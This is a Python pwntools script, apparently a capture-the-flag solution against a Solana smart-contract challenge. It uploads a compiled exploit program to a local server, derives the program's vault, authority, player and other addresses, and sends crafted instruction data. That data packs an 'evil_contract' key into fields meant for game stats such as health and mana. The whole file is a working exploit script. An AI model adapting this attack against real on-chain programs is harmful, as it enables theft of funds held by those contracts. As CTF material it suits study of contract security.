#!/usr/bin/env python3
import os
import base58

from pwn import *
from solana.publickey import PublicKey

HOST, PORT = "localhost:1337".split(":")

file_path = os.path.dirname(os.path.abspath(__file__))
filename = f"{file_path}/solution/dist/exploit.so"

data = b""
with open(filename, "rb") as file:
    data = file.read()

def start():
    return remote(args.HOST or HOST, args.PORT or PORT)

itob = lambda x: str(x).encode()

io = start()

length = len(data)
log.info(f"data len: {length}")
io.sendlineafter(b"length:\n", itob(length))
io.send(data)

pubkeys = dict()
accts = []

for i in range(10):
    key = io.recvuntil(b" pubkey: ", drop=True).decode()
    value = io.recvuntil(b"\n", drop=True).decode()
    pubkeys[key] = value
    print(f"{key}: {value}")

clock_pubkey = b"SysvarC1ock11111111111111111111111111111111"
# null-bytes encoded in base58
system_pubkey = b"11111111111111111111111111111111"

program_pubkey, program_seed = PublicKey.find_program_address([], PublicKey(pubkeys["program"]))
authority_pubkey, authority_seed = PublicKey.find_program_address([b"authority"], PublicKey(pubkeys["program"]))
print(f"authority: {authority_pubkey}")
vault_pubkey, vault_seed = PublicKey.find_program_address([b"vault"], PublicKey(pubkeys["program"]))
print(f"vault: {vault_pubkey}")
sanity_pubkey, sanity_seed = PublicKey.find_program_address([b"sanity"], PublicKey(pubkeys["program"]))
print(f"sanity: {sanity_pubkey}")
weapons_pubkey, weapons_seed = PublicKey.find_program_address([b"weapon"], PublicKey(pubkeys["program"]))
print(f"weapons: {weapons_pubkey}")
player_pubkey, player_seed = PublicKey.find_program_address([b"player"], PublicKey(pubkeys["program"]))
print(f"player: {player_pubkey}")
solve_item_pubkey, solve_item_seed = PublicKey.find_program_address([b"token"], PublicKey(pubkeys["program"]))
print(f"solve_item: {solve_item_pubkey}")
solve_item_1337_pubkey, solve_item_1337_seed = PublicKey.find_program_address([b"13337"], PublicKey(pubkeys["program"]))
print(f"solve_item_1337: {solve_item_1337_pubkey}")

accts.append(b"r " + clock_pubkey)
accts.append(b"r " + system_pubkey)
accts.append(b"r " + pubkeys["token"].encode())
accts.append(b"w " + pubkeys["mint"].encode()) # new_acc pubkey > program
accts.append(b"w " + solve_item_pubkey.to_base58())
accts.append(b"w " + pubkeys["mint1337"].encode()) # new_acc pubkey > program
accts.append(b"w " + solve_item_1337_pubkey.to_base58())
accts.append(b"w " + authority_pubkey.to_base58())
accts.append(b"ws " + pubkeys["user"].encode())
accts.append(b"w " + sanity_pubkey.to_base58())
accts.append(b"r " + pubkeys["rent"].encode())
accts.append(b"w " + player_pubkey.to_base58())
accts.append(b"w " + vault_pubkey.to_base58())
accts.append(b"r " + pubkeys["program"].encode())
accts.append(b"w " + pubkeys["item"].encode())
accts.append(b"w " + weapons_pubkey.to_base58())
accts.append(b"r " + pubkeys["evil_contract"].encode())
accts.append(b"w " + pubkeys["item1337"].encode())

length = len(accts)
io.sendline(itob(length))
for acct in accts:
    io.sendline(acct)

ix_bytes = b""
ix_bytes += p8(vault_seed)              # 0
ix_bytes += p8(solve_item_seed)         # 1
ix_bytes += p8(solve_item_1337_seed)    # 2
ix_bytes += p8(authority_seed)          # 3
ix_bytes += p8(player_seed)             # 4
ix_bytes += p8(weapons_seed)            # 5

name = base58.b58decode(pubkeys["evil_contract"])
health = 0xff - name[0]
mana = 0xff - name[1]

suffix = b""
suffix += p8(health)
suffix += p8(mana)
suffix += name[2:] + b"\x00"
io.sendline(itob(len(ix_bytes)+len(suffix)))
io.send(ix_bytes + suffix)

print(io.recvall(timeout=1).decode("utf-8"))
